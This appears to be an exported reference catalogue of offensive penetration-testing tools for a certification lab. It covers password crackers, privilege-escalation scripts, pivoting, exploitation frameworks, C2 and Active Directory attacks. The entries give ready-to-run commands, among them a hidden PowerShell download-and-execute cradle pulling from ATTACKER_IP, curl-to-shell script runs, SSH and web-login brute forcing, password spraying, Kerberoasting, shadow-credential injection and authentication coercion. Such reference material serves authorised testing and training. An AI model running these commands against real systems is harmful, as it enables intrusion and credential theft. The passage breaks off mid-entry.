- Related Techniques: 15 — asrep-roasting, cmdi-advanced, credential-harvesting-advanced, gpp-abuse, hash-cracking, hashcat-attacks, kerberoasting, lfi-advanced, overpass-the-hash, pass-the-hash
- Related Tools: 3 — hydra, john, tool:hashashcat

#### john — John the Ripper
- Zone: password-attacks | Category: password-attacks | Type: cracker
- OS: linux, windows, macos
- Purpose: Fast password cracker with community-enhanced version
- Tags: password-attacks, hashing, cracking, brute-force
- Install (kali): sudo apt install -y john
- Path: /usr/sbin/john
- Notes: Pre-installed on Kali
- Commands (2):
  - **Crack /etc/shadow with wordlist**: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
    - When: When you have obtained /etc/shadow or /etc/passwd
    - Output: Cracked passwords
  - **Show cracked passwords**: `john --show hashes.txt`
    - When: After running John to see results
    - Output: List of cracked usernames and passwords
- Related Techniques: 9 — asrep-roasting, gpp-abuse, hash-cracking, hashcat-attacks, ipv6-mitm, kerberoasting, password-spraying, tech:ntlm-cracking, tech:password-spraying
- Related Tools: 2 — hashcat, hydra

#### hydra — Hydra
- Zone: password-attacks | Category: password-attacks | Type: cracker
- OS: linux, windows, macos
- Purpose: Parallelized network login cracker
- Tags: password-attacks, brute-force, login, network, online
- Install (kali): sudo apt install -y hydra
- Path: /usr/bin/hydra
- Notes: Pre-installed on Kali
- Commands (2):
  - **SSH brute force**: `hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4`
    - When: When SSH is open and you have a username
    - Output: Valid SSH credentials if found
  - **HTTP POST form brute force**: `hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' -t 10`
    - When: When brute forcing web login forms
    - Output: Valid credentials if found
- Related Techniques: 5 — arp-discovery, hash-cracking, hashcat-attacks, password-spraying, pivoting
- Related Tools: 2 — hashcat, john

#### linpeas — LinPEAS
- Zone: privilege-escalation | Category: privilege-escalation | Type: analyzer
- OS: linux
- Purpose: Linux privilege escalation auditing tool
- Tags: privilege-escalation, linux, enumeration, audit, suid
- Install (kali): sudo apt install -y linpeas
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/PEASS-ng/linPEAS.sh
- Notes: Or download from GitHub PEASS-ng [toolkit-synced]
- Commands (2):
  - **Run LinPEAS for privilege escalation**: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
    - When: Immediately after gaining a low-privilege shell on Linux
    - Output: Privilege escalation vectors and recommendations
  - **Download and run linpeas**: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash`
    - When: Running linpeas when not already on target
    - Output: Color-coded privilege escalation findings
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum
- Related Tools: 10 — accesschk, beroot, find, getcap, icacls, jucypotato, linenum, linux-exploit-suggester, lse, powerup

#### winpeas — WinPEAS
- Zone: privilege-escalation | Category: privilege-escalation | Type: analyzer
- OS: windows
- Purpose: Windows privilege escalation auditing tool
- Tags: privilege-escalation, windows, enumeration, audit
- Install (kali): Download from PEASS-ng GitHub releases
- Path: /usr/bin/winpeas
- Notes: Run on Windows target
- Commands (2):
  - **Run WinPEAS from command line**: `winpeas.exe`
    - When: Immediately after gaining a low-privilege shell on Windows
    - Output: Privilege escalation vectors and recommendations
  - **Run WinPEAS with quiet mode**: `.\winPEASx64.exe quiet systeminfo userinfo servicesinfo`
    - When: Quiet Windows privilege escalation enumeration
    - Output: Filtered WinPEAS output for key areas
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum
- Related Tools: 10 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas

#### linenum — LinEnum
- Zone: privilege-escalation | Category: privilege-escalation | Type: analyzer
- OS: linux
- Purpose: Linux local enumeration script
- Tags: privilege-escalation, linux, enumeration, audit
- Install (kali): Download from rebootuser/LinEnum GitHub
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/LinEnum/LinEnum.sh
- Notes: Make executable: chmod +x LinEnum.sh [toolkit-synced]
- Commands (2):
  - **Run LinEnum**: `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
    - When: When you have a shell on a Linux target
    - Output: System info, SUID binaries, cron jobs, and escalation paths
  - **Run LinEnum with reporting**: `./LinEnum.sh -s -t -k PASSWORD -r REPORT.txt`
    - When: Generating a full LinEnum report with keyword search
    - Output: REPORT.txt with findings
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, delegation-enum, dll-hijacking, dns-enumeration, file-inclusion, gpp-cached-passwords
- Related Tools: 10 — accesschk, beroot, find, getcap, icacls, jucypotato, linpeas, linux-exploit-suggester, lse, powerup

#### powerup — PowerUp
- Zone: privilege-escalation | Category: privilege-escalation | Type: framework
- OS: windows
- Purpose: Windows privilege escalation via PowerShell
- Tags: privilege-escalation, windows, powershell, services, unquoted-paths
- Install (kali): Download from PowerSploit GitHub
- Path: /home/saad/Desktop/cpent-toolkit/07-privilege-escalation/PowerSploit/PowerSploit/Privesc/PowerUp.ps1
- Notes: Import-Module .\PowerUp.ps1 in PowerShell [toolkit-synced]
- Commands (2):
  - **Run PowerUp to find escalation paths**: `Invoke-AllChecks`
    - When: From a Windows shell with PowerShell access
    - Output: Service misconfigurations, DLL hijacking, and other escalation vectors
  - **Run PowerUp and save results**: `Invoke-AllChecks | Out-File -FilePath powerup_results.txt`
    - When: Saving PowerUp Windows privesc results to file
    - Output: powerup_results.txt with all checks
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-genericall, acl-abuse-writedacl, always-install-elevated, cron-jobs, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, sudo-misconfiguration
- Related Tools: 10 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas

#### chisel — Chisel
- Zone: lateral-movement | Category: lateral-movement | Type: proxy
- OS: linux, windows
- Purpose: Fast TCP/UDP tunneling and SOCKS proxy
- Tags: lateral-movement, pivoting, tunneling, socks, proxy
- Install (kali): sudo apt install -y chisel
- Path: /usr/local/bin/chisel
- Notes: Pre-installed on Kali; also download static binaries for targets
- Commands (2):
  - **Start Chisel server on attacker**: `chisel server -p 8000 --reverse`
    - When: When setting up a pivot point from your attack machine
    - Output: Chisel server listening for connections
  - **Connect from target to attacker**: `chisel client TARGET_IP:8000 R:socks`
    - When: When you have a shell on a target and need pivoting
    - Output: SOCKS proxy on localhost:1080
- Related Techniques: 8 — burp-workflow, double-pivot, overpass-the-hash, pass-the-ticket, pivoting, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 7 — ligolo-ng, proxychains4, rpivot, scp, socat, ssh, sshuttle

#### ligolo-ng — Ligolo-NG
- Zone: lateral-movement | Category: lateral-movement | Type: proxy
- OS: linux, windows
- Purpose: Modern tunneling and pivoting tool
- Tags: lateral-movement, pivoting, tunneling, socks, proxy
- Install (kali): sudo apt install -y ligolo-ng
- Path: /home/saad/Desktop/cpent-toolkit/08-lateral-movement/ligolo-ng
- Notes: Agent binary must be transferred to target [toolkit-synced]
- Commands (2):
  - **Start Ligolo proxy on attacker**: `./proxy -selfcert`
    - When: When setting up a pivot tunnel
    - Output: Proxy server listening
  - **Connect agent from target**: `./agent -connect TARGET_IP:11601 -ignore-cert`
    - When: When you have a shell on a target
    - Output: Agent connected to proxy
- Related Techniques: 8 — burp-workflow, double-pivot, overpass-the-hash, pass-the-ticket, pivoting, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 7 — chisel, proxychains4, rpivot, scp, socat, ssh, sshuttle

#### proxychains4 — Proxychains4
- Zone: lateral-movement | Category: lateral-movement | Type: proxy
- OS: linux
- Purpose: Force TCP connections through SOCKS/HTTP proxies
- Tags: lateral-movement, pivoting, proxy, tunneling
- Install (kali): sudo apt install -y proxychains4
- Path: /usr/bin/proxychains4
- Notes: Configure /etc/proxychains4.conf
- Commands (2):
  - **Run tool through SOCKS proxy**: `proxychains4 nmap -sT -p 80,443 TARGET_INTERNAL_IP`
    - When: When you need to route tools through an established tunnel
    - Output: Nmap scan results through the proxy
  - **Proxychains with nmap through SOCKS**: `proxychains4 -q nmap -sT -Pn -p 22,80,443 TARGET_IP`
    - When: Scanning through SOCKS proxy with proxychains
    - Output: Nmap results routed through proxy
- Related Techniques: 9 — burp-workflow, double-pivot, heap-house-of-force, overpass-the-hash, pass-the-ticket, pivoting, tech:port-forwarding, tech:socks-proxy, tech:sshuttle
- Related Tools: 7 — chisel, ligolo-ng, rpivot, scp, socat, ssh, sshuttle

#### socat — Socat
- Zone: lateral-movement | Category: lateral-movement | Type: proxy
- OS: linux
- Purpose: Multi-purpose relay for TCP/UDP/SOCKS
- Tags: lateral-movement, relay, tunneling, tcp
- Install (kali): sudo apt install -y socat
- Path: /usr/bin/socat
- Notes: Pre-installed on Kali
- Commands (2):
  - **Create TCP relay**: `socat TCP-LISTEN:4444,fork,reuseaddr TCP:TARGET_IP:4444`
    - When: When you need to relay a port to an internal target
    - Output: Traffic relayed from local port 4444 to target
  - **TCP port forward with socat**: `socat TCP-LISTEN:4444,fork,reuseaddr TCP:NEXT_HOP:4444`
    - When: Forwarding ports through pivot hosts
    - Output: Local port 4444 forwarded to next hop
- Related Techniques: 7 — adcs-esc8, double-pivot, ntlm-relay, overpass-the-hash, pass-the-ticket, pivoting, tech:socks-proxy
- Related Tools: 6 — chisel, ligolo-ng, proxychains4, scp, ssh, sshuttle

#### metasploit — Metasploit Framework
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: framework
- OS: linux, windows
- Purpose: Comprehensive exploitation framework
- Tags: exploitation, framework, exploits, post-exploitation, modules
- Install (kali): sudo apt install -y metasploit-framework
- Path: /usr/bin/msfconsole
- Notes: Start with msfconsole; pre-installed on Kali
- Commands (2):
  - **Start msfconsole**: `msfconsole`
    - When: When launching exploits or doing post-exploitation
    - Output: Metasploit console prompt
  - **Use exploit and set options**: `use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
exploit`
    - When: When launching a specific exploit
    - Output: Exploit execution and potential shell
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation
- Related Tools: 4 — searchsploit, tool:empire, tool:metasploit, tool:powershell-empire

#### searchsploit — SearchSploit
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Type: analyzer
- OS: linux, windows
- Purpose: Search Exploit-DB for public exploits
- Tags: exploitation, exploits, search, vulnerability
- Install (kali): sudo apt install -y exploitdb
- Path: /usr/bin/searchsploit
- Notes: Update with searchsploit -u
- Commands (2):
  - **Search for exploits by software name**: `searchsploit openssl 1.0.1`
    - When: When you identify software and version on a target
    - Output: List of matching exploits from Exploit-DB
  - **Copy exploit to working directory**: `searchsploit -m 12345.py`
    - When: When you found a relevant exploit and want to use it
    - Output: Exploit copied to current directory
- Related Techniques: 15 — buffer-overflow, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation, rop-chain, shellcode-development, sudo-misconfiguration
- Related Tools: 1 — metasploit

#### whois — Whois
- Zone: recon | Category: recon | Type: tool
- OS: linux, windows, macos
- Purpose: Query domain registration information
- Tags: recon, whois, domain, passive, osint
- Install (kali): sudo apt install -y whois
- Path: /usr/bin/whois
- Notes: Pre-installed on Kali
- Commands (2):
  - **Look up domain registration**: `whois target.com`
    - When: At the start of passive reconnaissance
    - Output: Registrar, name servers, admin contacts, and registration dates
  - **WHOIS lookup for IP/netblock**: `whois -h whois.arin.net NETBLOCK_IP`
    - When: Finding netblock ownership and contacts
    - Output: ARIN registration details for IP range
- Related Techniques: 15 — dcsync, dns-enumeration, passive-recon, tech:kerberoasting, tech:llmnr-nbtspoofing, tech:ntlm-cracking, tech:pass-the-hash, tech:password-spraying, tech:powerview, tech:ps-remoting
- Related Tools: 10 — amass, curl, dig, foca, grep, httpx, ivre, masscan, metagoofil, naabu

#### steghide — Steghide
- Zone: ctf | Category: ctf | Type: analyzer
- OS: linux, windows, macos
- Purpose: Hide and extract data in image and audio files
- Tags: ctf, steganography, images, audio, hidden
- Install (kali): sudo apt install -y steghide
- Path: /usr/bin/steghide
- Notes: Pre-installed on Kali
- Commands (2):
  - **Extract hidden data**: `steghide extract -sf image.jpg -p password`
    - When: When you suspect a file contains hidden data
    - Output: Extracted hidden file if passphrase is correct
  - **Check if steganography is present**: `steghide info IMAGE.jpg`
    - When: Checking if an image contains hidden data without extracting
    - Output: Confirms if steganography is present and if password is needed
- Related Techniques: 2 — crypto-analysis, steganography
- Related Tools: 4 — cyberchef, exiftool, stegcracker, stegsolve

#### powershell — PowerShell
- Zone: active-directory | Category: active-directory | Type: framework
- OS: windows
- Purpose: Windows scripting and automation framework
- Tags: active-directory, windows, scripting, automation, powershell
- Install (kali): sudo apt install -y powershell
- Path: /usr/bin/pwsh
- Notes: pwsh is PowerShell Core on Linux
- Commands (2):
  - **Download and execute script**: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"`
    - When: When executing PowerShell scripts on Windows targets
    - Output: Script execution output
  - **Run PowerShell script**: `powershell -ExecutionPolicy Bypass -File SCRIPT.ps1`
    - When: Executing PowerShell scripts on Windows
    - Output: Script execution output
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, asrep-roasting
- Related Tools: 10 — bloodhound, certipy, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, ldapsearch

#### empire — Empire
- Zone: post-exploitation | Category: post-exploitation | Type: framework
- OS: linux, windows
- Purpose: Post-exploitation and C2 framework
- Tags: post-exploitation, c2, powershell, python, agents
- Install (kali): Download from BC-Security Empire GitHub
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/Empire
- Notes: cd empire && ./install.sh && ./ps/empire [toolkit-synced]
- Commands (2):
  - **Start Empire listener**: `./empire --rest`
    - When: When setting up C2 infrastructure
    - Output: Empire server running with REST API
  - **Create Empire HTTP listener**: `(in Empire) uselistener http; set Port 8080; execute`
    - When: Setting up C2 listener in Empire
    - Output: HTTP listener on port 8080
- Related Techniques: 15 — buffer-overflow, c2-establishment, credential-harvesting, credential-harvesting-advanced, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation
- Related Tools: 5 — covenant, lazagne, nishang, screen, sliver

#### covenant — Covenant
- Zone: post-exploitation | Category: post-exploitation | Type: framework
- OS: linux, windows
- Purpose: .NET C2 framework for red team operations
- Tags: post-exploitation, c2, .net, dotnet, agents
- Install (kali): Download from Covenant GitHub
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/Covenant
- Notes: Requires .NET 6+; dotnet run [toolkit-synced]
- Commands (2):
  - **Start Covenant server**: `dotnet Covenant.dll`
    - When: When setting up .NET C2 infrastructure
    - Output: Covenant web interface on port 7443
  - **Create Covenant Grunt listener**: `(in Covenant UI) Create Grunt → HTTP → Generate`
    - When: Creating a new Grunt implant in Covenant
    - Output: Generated Grunt payload and listener
- Related Techniques: 11 — c2-establishment, credential-harvesting, credential-harvesting-advanced, metasploit-exploitation, persistence, persistence-advanced, tech:lsass-dump, tech:mimikatz, tech:persistence-cron, tech:persistence-registry
- Related Tools: 5 — empire, lazagne, nishang, screen, sliver

#### netdiscover — Netdiscover
- Zone: network-enum | Category: network-enum | Type: scanner
- OS: linux
- Purpose: Active/passive ARP reconnaissance
- Tags: network-enum, arp, recon, lan, discovery
- Install (kali): sudo apt install -y netdiscover
- Path: /usr/sbin/netdiscover
- Notes: Pre-installed on Kali
- Commands (2):
  - **Active ARP scan**: `netdiscover -r TARGET_SUBNET`
    - When: When you need to discover live hosts on a local network
    - Output: Live hosts with MAC addresses and IPs
  - **Passive ARP discovery**: `netdiscover -r 192.168.X.0/24 -i eth0 -P`
    - When: Passive network host discovery without sending packets
    - Output: List of discovered hosts via ARP
- Related Techniques: 6 — arp-discovery, dns-enumeration, passive-recon, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 10 — arp-scan, ip, ls, onesixtyone, showmount, smbclient, smbmap, snmpwalk, tool:dnscan, tool:httprobe

#### arp-scan — ARP Scan
- Zone: network-enum | Category: network-enum | Type: scanner
- OS: linux, macos
- Purpose: ARP ping scan for live host discovery
- Tags: network-enum, arp, recon, lan, discovery
- Install (kali): sudo apt install -y arp-scan
- Path: /usr/sbin/arp-scan
- Notes: Pre-installed on Kali; requires root
- Commands (2):
  - **ARP scan of local subnet**: `arp-scan --local --interface eth0`
    - When: When ICMP is filtered but ARP is allowed
    - Output: Live hosts with MAC and IP addresses
  - **ARP scan local network**: `arp-scan --localnet --interface=eth0 | grep -v "^Starting\|^Interface\|packets"`
    - When: Discovering hosts on local network via ARP
    - Output: Live hosts with IP and MAC addresses
- Related Techniques: 6 — arp-discovery, dns-enumeration, passive-recon, snmp-enumeration, tech:port-forwarding, tech:powerview
- Related Tools: 10 — ip, ls, netdiscover, onesixtyone, showmount, smbclient, smbmap, snmpwalk, tool:dnscan, tool:httprobe

#### onesixtyone — onesixtyone
- Zone: network-enum | Category: network-enum | Type: cracker
- OS: linux
- Purpose: SNMP community string brute forcer
- Tags: network-enum, snmp, brute-force, community-string
- Install (kali): sudo apt install -y onesixtyone
- Path: /usr/bin/onesixtyone
- Notes: Pre-installed on Kali
- Commands (2):
  - **Brute force SNMP community strings**: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common_snmp_community_strings.txt TARGET_IP`
    - When: When SNMP is open but community string is unknown
    - Output: Valid community strings
  - **SNMP brute force with wordlist**: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP`
    - When: Brute forcing SNMP community strings
    - Output: Valid community strings
- Related Techniques: 6 — arp-discovery, format-string, format-string-exploit, password-spraying, snmp-enumeration, tech:port-forwarding
- Related Tools: 8 — arp-scan, ip, ls, netdiscover, showmount, smbclient, smbmap, snmpwalk

#### snmpwalk — snmpwalk
- Zone: network-enum | Category: network-enum | Type: client
- OS: linux
- Purpose: SNMP MIB walker for enumerating SNMP data
- Tags: network-enum, snmp, enumeration, mib, walk
- Install (kali): sudo apt install -y snmp
- Path: /usr/bin/snmpwalk
- Notes: Part of net-snmp package
- Commands (2):
  - **Walk SNMP OID tree**: `snmpwalk -v2c -c COMMUNITY_STRING TARGET_IP`
    - When: After obtaining valid SNMP community string
    - Output: System info, network interfaces, processes, and software versions
  - **Full SNMP MIB walk**: `snmpwalk -v2c -c public TARGET_IP .1.3.6.1.2.1`
    - When: Enumerating full SNMP tree
    - Output: All SNMP OIDs and values
- Related Techniques: 7 — arp-discovery, delegation-enum, dns-enumeration, kerberos-delegation-enum, smb-enumeration, snmp-enumeration, tech:port-forwarding
- Related Tools: 8 — arp-scan, ip, ls, netdiscover, onesixtyone, showmount, smbclient, smbmap

#### sshuttle — SSHuttle
- Zone: lateral-movement | Category: lateral-movement | Type: proxy
- OS: linux, macos
- Purpose: VPN-like tunneling through SSH
- Tags: lateral-movement, pivoting, tunneling, ssh, vpn
- Install (kali): sudo apt install -y sshuttle
- Path: /usr/bin/sshuttle
- Notes: Pre-installed on Kali
- Commands (2):
  - **Create tunnel through SSH**: `sshuttle -r USER@PIVOT_HOST 10.0.0.0/24`
    - When: When you have SSH access to a pivot host
    - Output: Transparent routing through SSH tunnel
  - **SSH-based VPN tunnel**: `sshuttle -r user@TARGET_IP 10.0.0.0/8`
    - When: Creating transparent proxy through SSH
    - Output: Routes entire subnet through SSH tunnel
- Related Techniques: 7 — double-pivot, overpass-the-hash, pass-the-ticket, pivoting, tech:port-forwarding, tech:ssh-lateral, tech:sshuttle
- Related Tools: 7 — chisel, ligolo-ng, proxychains4, rpivot, scp, socat, ssh

#### eyewitness — EyeWitness
- Zone: reporting | Category: reporting | Type: scanner
- OS: linux, windows
- Purpose: Web service screenshot and reporting tool
- Tags: reporting, screenshots, web, documentation
- Install (kali): Download from FortaliceLLC EyeWitness GitHub
- Path: /usr/bin/eyewitness
- Notes: Python3 script
- Commands (2):
  - **Screenshot web services from file**: `eyewitness -f urls.txt --web --out ./screenshots/`
    - When: When documenting discovered web services
    - Output: Screenshots and report HTML file
  - **EyeWitness web screenshot report**: `python3 EyeWitness.py --web -f urls.txt --timeout 10`
    - When: Generating visual report of web interfaces
    - Output: Screenshots and HTML report
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, reporting-screenshots, sql-injection, ssrf, tech:broken-access-control, tech:cloud-metadata, tech:csrf
- Related Tools: 3 — aquatone, cherrytree, flameshot

#### aquatone — Aquatone
- Zone: reporting | Category: reporting | Type: scanner
- OS: linux, macos, windows
- Purpose: Visual reconnaissance and screenshot reporting
- Tags: reporting, screenshots, web, documentation
- Install (kali): sudo apt install -y aquatone
- Path: /usr/bin/aquatone
- Notes: Pre-installed on Kali
- Commands (2):
  - **Screenshot discovered hosts**: `cat live-hosts.txt | aquatone -out ./aquatone-report/`
    - When: When documenting web attack surface
    - Output: Screenshots and HTML report
  - **Aquatone visual recon**: `cat domains.txt | aquatone -ports xlarge -out ./aquatone_results`
    - When: Visual reconnaissance of web hosts
    - Output: Screenshots and recon data in output folder
- Related Techniques: 15 — burp-workflow, cmdi-advanced, file-inclusion, lfi-advanced, passive-recon, reporting-screenshots, sql-injection, ssrf, tech:broken-access-control, tech:csrf
- Related Tools: 3 — cherrytree, eyewitness, flameshot

#### flameshot — Flameshot
- Zone: reporting | Category: reporting | Type: tool
- OS: linux, windows
- Purpose: Advanced screenshot tool with annotations
- Tags: reporting, screenshots, documentation, annotations
- Install (kali): sudo apt install -y flameshot
- Path: /usr/bin/flameshot
- Notes: Pre-installed on Kali
- Commands (2):
  - **Take annotated screenshot**: `flameshot gui`
    - When: When documenting findings during engagement
    - Output: Annotated screenshot saved to file
  - **Flameshot screenshot to directory**: `flameshot gui -p /opt/cpent-toolkit/12-reporting/session1-notes/screenshots/`
    - When: Taking annotated screenshots for reports
    - Output: Screenshot saved to specified directory
- Related Techniques: 8 — cmdi-advanced, credential-harvesting-advanced, hashcat-attacks, ipv6-mitm, lfi-advanced, persistence-advanced, reporting-screenshots, srop
- Related Tools: 3 — aquatone, cherrytree, eyewitness

#### nxc — NetExec (nxc)
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows, macos
- Purpose: Modern successor to CrackMapExec for network service enumeration and exploitation
- Tags: ad, smb, enumeration, crackmapexec, lateral-movement
- Install (kali): pip3 install netexec
- Path: /usr/bin/nxc
- Notes: Successor to CrackMapExec; CME is deprecated
- Commands (2):
  - **SMB enumeration of range**: `nxc smb 172.25.170.0/24`
    - When: Initial AD host discovery and domain mapping
    - Output: IP, hostname, OS, domain, SMB signing status
  - **Password spraying with continue-on-success**: `nxc smb TARGET_RANGE -u users.txt -p 'Password123' --continue-on-success`
    - When: Spraying passwords against multiple users/hosts
    - Output: Valid credential pairs with Pwn3d! indicator for admin access
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, arp-discovery, asrep-roasting
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, impacket, kerbrute, krbrelayx

#### rubeus — Rubeus
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: windows
- Purpose: Kerberos ticket manipulation and abuse toolkit
- Tags: ad, kerberos, rubeus, ghostpack, tickets
- Install (kali): Download from GhostPack GitHub releases
- Path: /home/saad/Desktop/cpent-toolkit/10-post-exploitation/Rubeus/Rubeus/Rubeus.exe
- Notes: Run on Windows target with .NET; upload to target or execute via memory [toolkit-synced]
- Commands (2):
  - **Kerberoasting with Rubeus**: `Rubeus.exe kerberoast /outfile:hashes.txt`
    - When: Extracting TGS tickets for offline cracking
    - Output: Hashcat-compatible Kerberoast hashes
  - **AS-REP roasting with Rubeus**: `Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat`
    - When: Roasting users without pre-authentication
    - Output: AS-REP hashes for offline cracking
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, kerbrute, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc

#### sharphound — SharpHound
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: windows
- Purpose: BloodHound data collector for Active Directory
- Tags: ad, bloodhound, enumeration, attack-paths
- Install (kali): Download from BloodHoundAD GitHub releases
- Path: /usr/bin/sharphound
- Notes: Run on Windows target with DA/EA credentials
- Commands (2):
  - **Collect all BloodHound data**: `SharpHound.exe -c All --zipfilename bh.zip`
    - When: Full AD enumeration for BloodHound analysis
    - Output: bh.zip containing JSON files for all AD objects
  - **Collection with specific methods**: `SharpHound.exe -c Group,LocalAdmin,Session,GPOLocalGroup,Trusts`
    - When: Targeted collection to reduce noise
    - Output: Smaller ZIP with specific data types
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodhound, bloodyad, certify, coercer, crackmapexec, enum4linux, kerbrute, krbrelayx, ldapnomnom

#### whisker — Whisker
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: windows, linux
- Purpose: Shadow Credentials attack via msDS-KeyCredentialLink
- Tags: ad, shadow-credentials, kerberos, persistence
- Install (kali): git clone https://github.com/eladshamir/Whisker
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/Whisker/Whisker.exe
- Notes: Build with Visual Studio or download precompiled binary [toolkit-synced]
- Commands (2):
  - **List existing key credentials**: `Whisker.exe list /target:DOMAIN\User`
    - When: Checking if target already has shadow credentials
    - Output: Existing key credential link IDs
  - **Add shadow credential**: `Whisker.exe add /target:DOMAIN\User`
    - When: Adding attacker-controlled key credential to target user
    - Output: PFX file and certificate information for TGT request
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, kerbrute, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc

#### coercer — Coercer
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: linux, windows
- Purpose: Authenticate coercion using 12+ methods (PetitPotam, PrinterBug, etc.)
- Tags: ad, coercion, ntlm-relay, petitpotam, printerbug
- Install (kali): pip3 install coercer
- Path: /home/saad/.local/bin/coercer
- Notes: Python3 tool; requires valid domain credentials
- Commands (2):
  - **Coerce authentication from target**: `coercer coerce -t TARGET_IP -m CoerceV1 -u DOMAIN\User -p Pass`
    - When: Forcing target DC/host to authenticate to attacker
    - Output: NTLM authentication captured for relay
  - **Scan for coercion methods**: `coercer scan -t TARGET_IP -u DOMAIN\User -p Pass`
    - When: Identifying which coercion methods work against target
    - Output: List of supported/working coercion methods
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodyad, certify, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc, petitpotam, plumhound

#### petitpotam — PetitPotam
- Zone: active-directory | Category: active-directory | Type: exploitation
- OS: linux, windows
- Purpose: MS-EFSRPC authentication coercion
- Tags: ad, petitpotam, coercion, ntlm-relay, efsrpc
- Install (kali): git clone https://github.com/topotam/PetitPotam
- Path: /home/saad/Desktop/cpent-toolkit/03-active-directory/PetitPotam
- Notes: Python3 script; requires Impacket [toolkit-synced]
- Commands (2):
  - **Coerce authentication with PetitPotam**: `python3 PetitPotam.py -d DOMAIN -u User -p Pass ATTACKER_IP TARGET_IP`
    - When: Forcing target to authenticate to attacker for NTLM relay
    - Output: NTLMv2 hash captured if relay listener is active
  - **Coerce with unauthenticated variant**: `python3 PetitPotam.py TARGET_IP ATTACKER_IP`
    - When: When no credentials are available
    - Output: May still coerce depending on target configuration
- Related Techniques: 15 — acl-abuse-addmember, acl-abuse-forcechangepassword, acl-abuse-genericall, acl-abuse-genericwrite, acl-abuse-writedacl, adcs-esc1, adcs-esc4, adcs-esc8, asrep-roasting, constrained-delegation-s4u
- Related Tools: 10 — adidnsdump, bloodyad, certify, coercer, krbrelayx, ldapnomnom, ldaprelayscan, ldeep, nxc, plumhound

#### windapsearch — Windapsearch
- Zone: active-directory | Category: active-directory | Type: enumeration
- OS: linux, windows
- Purpose: Fast Go-based LDAP enumeration for Active Directory
